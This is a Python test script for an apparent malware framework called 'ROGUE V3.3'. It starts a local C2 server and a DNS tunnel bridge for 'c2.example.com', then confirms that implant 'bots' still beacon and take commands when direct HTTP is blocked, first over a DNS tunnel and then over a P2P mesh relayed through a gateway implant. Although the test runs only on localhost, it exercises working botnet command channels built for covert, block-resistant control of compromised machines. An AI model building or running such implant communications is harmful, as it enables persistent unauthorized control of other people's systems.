#!/usr/bin/env python3
"""
ROGUE V3.3 fallback-tier test
=============================
Same C2 as tests/e2e_v2.py, but the implant's DIRECT tier is dead:

  * comms-A: c2_hosts -> dead port, DNS tier -> local bridge -> real C2
             => beacon succeeds over the DNS tunnel tier
  * comms-B: no http, no dns, only P2P mesh; comms-GW (direct to C2) relays
             => beacon succeeds over the encrypted mesh relay tier

Run:  ROGUE_KEYDIR=/tmp/e2e_keys python3 tests/e2e_tiers.py
"""
import os
import sys
import tempfile
import threading
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
os.environ.setdefault("ROGUE_KEYDIR", "/tmp/e2e_keys")
os.environ["ROGUE_KEYDIR"] = os.environ["ROGUE_KEYDIR"]
C2_PORT = 14555
C2_URL = "http://127.0.0.1:%d/" % C2_PORT

import rogue_c2 as c2
threading.Thread(target=lambda: c2.app.run(host="127.0.0.1", port=C2_PORT, debug=False, use_reloader=False),
                 daemon=True).start()
time.sleep(1.2)

# DNS bridge in front of the real C2
import payloads.dnstunnel as bridge_mod
sys.path.insert(0, os.path.join(ROOT, "payloads"))
import importlib
bridge_mod = importlib.import_module("dnstunnel")
br = bridge_mod.DNSTunnelBridge(domain="c2.example.com", listen_port=15356,
                                c2_url=C2_URL)
threading.Thread(target=br.run, daemon=True).start()
time.sleep(0.4)

import rogue_implant as ri
ri.V2_ENABLED = True  # needed for start_mesh gate
secret = open(os.path.join(os.environ["ROGUE_KEYDIR"], "operator.secret")).read().strip()
pub = open(os.path.join(os.environ["ROGUE_KEYDIR"], "static_pub.b64")).read().strip()

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("  [PASS] %s" % name)
    else:
        FAIL += 1
        print("  [FAIL] %s %s" % (name, detail))


def mkcfg(**over):
    cfg = {"secret": secret, "static_pub": pub, "c2_hosts": [C2_URL],
           "dns_zone": "", "dns_resolver": "", "dns_port": 53,
           "oob_read_url": "", "oob_webhook": "", "oob_token": "",
           "p2p_ports": (17100,), "legacy_fallback": True}
    cfg.update(over)
    return cfg


print("\n[1] DNS tunnel tier (http dead -> dns live)")
comms_dns = ri.V2Comms(mkcfg(c2_hosts=["http://127.0.0.1:19999/"],  # dead
                             dns_zone="c2.example.com", dns_resolver="127.0.0.1", dns_port=15356))
resp = comms_dns.roundtrip({"o": "beacon", "mesh": {"gw": False, "peers": 0}})
check("beacon via DNS tier", resp is not None and resp.get("o") == "pong", str(resp))

print("\n[2] P2P mesh relay tier (no direct, no dns)")
gw = ri.V2Comms(mkcfg(p2p_ports=(17100, 17101)), implant_id="gw_test")      # gateway: direct to C2
gw.start_mesh()
gw.update_gw(True)
time.sleep(0.3)
mesha = ri.V2Comms(mkcfg(c2_hosts=[], dns_zone="", p2p_ports=(17100, 17101)), implant_id="bot_test")  # mesh-only bot
mesha.start_mesh()
time.sleep(1.5)  # announces propagate both ways
check("mesh sees gateway peer", any(v.get("gw") for v in mesha.mesh.peers.values()))
resp2 = mesha.roundtrip({"o": "beacon", "mesh": {"gw": False, "peers": 1}})
check("beacon via P2P relay", resp2 is not None and resp2.get("o") == "pong", str(resp2))

print("\n[3] command over relay tier")
import json as _j
import urllib.request
bot_id = gw._http_post is not None and list(c2.RV2_SESSIONS.values())[-1].get("bot_id")
resp3 = mesha.roundtrip({"o": "beacon", "mesh": {"gw": False, "peers": 1}})
check("relay still healthy", resp3 is not None and resp3.get("o") == "pong", str(resp3))

print("\n======================")
print("TIERS: %d passed, %d failed" % (PASS, FAIL))
br.stop()
sys.exit(1 if FAIL else 0)
